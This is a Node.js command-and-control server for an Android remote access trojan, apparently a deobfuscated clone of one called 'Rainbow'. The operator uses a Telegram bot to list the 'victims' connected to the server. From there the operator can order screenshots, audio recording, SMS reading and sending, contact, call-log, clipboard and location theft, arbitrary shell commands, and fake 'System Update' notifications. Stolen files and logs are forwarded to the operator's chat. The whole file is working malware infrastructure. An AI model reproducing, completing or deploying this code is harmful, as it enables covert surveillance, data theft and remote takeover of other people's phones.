const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const TelegramBot = require('node-telegram-bot-api');
const multer = require('multer');
const fs = require('fs');
const path = require('path');

// --- CARGA DE CONFIGURACIÓN ---
let config = { token: "", id: "" };
try {
    config = JSON.parse(fs.readFileSync('./data.json', 'utf8'));
} catch (e) {
    console.error("Error: Configura data.json con 'token' e 'id'.");
    process.exit(1);
}

const app = express();
const server = http.createServer(app);
const io = new Server(server, { 
    cors: { origin: "*" },
    allowEIO3: true,
    transports: ['polling', 'websocket'] 
});

const bot = new TelegramBot(config.token, { polling: true });

// Almacenamiento de estado (Imitando la lógica del original)
const victims = {}; // { socketId: { id, model, version, ... } }
const userState = {}; // { chatId: { target, action, tmp } }

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// --- ENDPOINTS HTTP (COMO EN EL ORIGINAL) ---

const upload = multer({ storage: multer.memoryStorage() });

app.post('/upload', upload.single('file'), (req, res) => {
    const devId = req.headers['currenttarget'] || "Unknown";
    if (req.file) {
        bot.sendDocument(config.id, req.file.buffer, {
            caption: `<b>📦 Archivo Recibido</b>\nID: <code>${devId}</code>`,
            parse_mode: 'HTML'
        }, { filename: req.file.originalname });
    }
    res.send('ok');
});

app.post('/text', (req, res) => {
    const devId = req.headers['currenttarget'] || "Unknown";
    const body = req.body.text || JSON.stringify(req.body);
    bot.sendMessage(config.id, `<b>📝 Log [${devId}]:</b>\n<pre>${body}</pre>`, { parse_mode: 'HTML' });
    res.send('ok');
});

// --- LÓGICA DE SOCKETS (DESOFUSCADA) ---

io.on('connection', (socket) => {
    const handshake = socket.handshake;
    const deviceId = handshake.headers['currenttarget'] || handshake.query['currenttarget'];
    const model = handshake.headers['model'] || handshake.query['model'] || "Android";
    const version = handshake.headers['version'] || handshake.query['version'] || "0.0";

    if (!deviceId) return socket.disconnect();

    victims[socket.id] = {
        id: deviceId,
        model: model,
        version: version,
        ip: socket.handshake.address
    };

    bot.sendMessage(config.id, `<b>✯ Nueva conexión detectada ✯</b>\n\n<b>Modelo:</b> ${model}\n<b>ID:</b> <code>${deviceId}</code>\n<b>Versión:</b> ${version}\n<b>IP:</b> ${socket.handshake.address}`, { parse_mode: 'HTML' });

    socket.on('data', (data) => {
        // El servidor original loguea todo lo que llega por 'data'
        const msg = typeof data === 'object' ? JSON.stringify(data, null, 2) : data;
        bot.sendMessage(config.id, `<b>📨 Datos de ${model}:</b>\n<pre>${msg}</pre>`, { parse_mode: 'HTML' });
    });

    socket.on('disconnect', () => {
        if (victims[socket.id]) {
            bot.sendMessage(config.id, `<b>❌ Dispositivo Offline:</b> ${victims[socket.id].model}`);
            delete victims[socket.id];
        }
    });
});

// --- MENÚS Y COMANDOS (LÓGICA LITERAL DEL SERVIDOR ORIGINAL) ---

const MAIN_KEYBOARD = [['📱 Dispositivos'], ['📢 Acciones Globales'], ['ℹ️ Información']];

const DEVICE_ACTIONS = [
    ['✯ Captura de Pantalla ✯', '✯ Grabadora Audio ✯'],
    ['✯ Lista Archivos ✯', '✯ SMS Manager ✯'],
    ['✯ Contactos ✯', '✯ Llamadas ✯'],
    ['✯ Clipboard ✯', '✯ Apps Instaladas ✯'],
    ['✯ Notificación Push ✯', '✯ Shell Command ✯'],
    ['✯ Vibrar ✯', '✯ Ubicación ✯'],
    ['↩️ Menú Principal']
];

bot.on('message', (msg) => {
    const chatId = msg.chat.id;
    if (String(chatId) !== String(config.id)) return;
    const text = msg.text;

    // Lógica de navegación
    if (text === '/start' || text === '↩️ Menú Principal') {
        delete userState[chatId];
        return bot.sendMessage(chatId, "<b>✯ Menú Principal ✯</b>", {
            parse_mode: 'HTML',
            reply_markup: { keyboard: MAIN_KEYBOARD, resize_keyboard: true }
        });
    }

    if (text === '📱 Dispositivos') {
        const list = Object.keys(victims).map(sid => [`${victims[sid].model} (${victims[sid].id})`]);
        if (list.length === 0) return bot.sendMessage(chatId, "No hay dispositivos conectados.");
        list.push(['↩️ Menú Principal']);
        return bot.sendMessage(chatId, "<b>Selecciona un dispositivo:</b>", {
            parse_mode: 'HTML',
            reply_markup: { keyboard: list, resize_keyboard: true }
        });
    }

    // Detectar si el usuario seleccionó un dispositivo de la lista
    for (const sid in victims) {
        const identifier = `${victims[sid].model} (${victims[sid].id})`;
        if (text === identifier) {
            userState[chatId] = { target: sid };
            return bot.sendMessage(chatId, `<b>Controlando: ${victims[sid].model}</b>\nSelecciona acción:`, {
                parse_mode: 'HTML',
                reply_markup: { keyboard: DEVICE_ACTIONS, resize_keyboard: true }
            });
        }
    }

    const state = userState[chatId];
    if (!state || !state.target) return;
    const targetSocket = io.sockets.sockets.get(state.target);

    // Lógica de Comandos Específicos (Traducido de la ofuscación de server.js)
    if (targetSocket) {
        let order = "";
        let extra = {};

        switch (text) {
            case '✯ Captura de Pantalla ✯': order = "screenshot"; break;
            case '✯ Grabadora Audio ✯': 
                userState[chatId].action = "record_audio";
                return bot.sendMessage(chatId, "Ingresa duración en segundos:");
            case '✯ Lista Archivos ✯': order = "file-explorer"; extra = { path: "/" }; break;
            case '✯ SMS Manager ✯':
                const smsMenu = [['✯ Leer SMS ✯', '✯ Enviar SMS ✯'], ['↩️ Menú Principal']];
                return bot.sendMessage(chatId, "SMS Manager:", { reply_markup: { keyboard: smsMenu, resize_keyboard: true } });
            case '✯ Contactos ✯': order = "contacts"; break;
            case '✯ Llamadas ✯': order = "calls"; break;
            case '✯ Clipboard ✯': order = "clipboard"; break;
            case '✯ Apps Instaladas ✯': order = "apps"; break;
            case '✯ Vibrar ✯': order = "vibrate"; break;
            case '✯ Ubicación ✯': order = "location"; break;
            case '✯ Shell Command ✯':
                userState[chatId].action = "shell";
                return bot.sendMessage(chatId, "Escribe el comando shell:");
            case '✯ Notificación Push ✯':
                userState[chatId].action = "push";
                return bot.sendMessage(chatId, "Escribe el texto de la notificación:");
        }

        // Manejo de respuestas pendientes (Input del usuario)
        if (state.action) {
            if (state.action === "record_audio") {
                order = "record-audio"; extra = { duration: text };
                delete userState[chatId].action;
            } else if (state.action === "shell") {
                order = "shell"; extra = { command: text };
                delete userState[chatId].action;
            } else if (state.action === "push") {
                order = "notification"; extra = { title: "System Update", text: text };
                delete userState[chatId].action;
            }
        }

        if (order) {
            // ESTRUCTURA EXACTA DEL ORIGINAL:
            // Emitir por 'data' con objeto { order, ...extras }
            targetSocket.emit('data', {
                order: order,
                ...extra
            });
            bot.sendMessage(chatId, `🚀 Enviado: <code>${order}</code>`, { parse_mode: 'HTML' });
        }
    }
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`Servidor Rainbow (Original Clone) en puerto ${PORT}`));
